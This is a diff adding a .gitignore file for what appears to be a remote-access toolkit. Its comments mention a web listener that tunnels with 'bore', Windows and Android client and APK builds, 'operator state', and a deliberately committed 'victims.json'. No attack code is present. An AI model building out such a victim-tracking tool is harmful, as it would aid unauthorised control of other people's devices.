@@ -1,0 +1,30 @@
+# signing key material - never commit
+build_keys/*.key
+build_keys/*.pfx
+build_keys/*.p12
+
+# build artifacts - regenerate with ./install.sh + the /builder page
+build_output/
+apk_builder/build/
+*.exe
+*.apk
+*.class
+*.idsig
+*.o
+*.obj
+*.dll
+
+# 9-byte "Not Found" body from a 404'd GitHub release download.
+# `bore` is run from PATH by web_listener.py, so nothing here needs bundling.
+bore-v0.5.1-x86_64-unknown-linux-gnu.tar.gz
+
+# python bytecode
+__pycache__/
+*.pyc
+
+# runtime operator state - created on demand by web_listener.py
+# NOTE: data/ is intentionally NOT ignored; it holds psk.json / listeners.json
+# / victims.json and is committed on purpose.
+clients/
+android_clients/
+uploads/
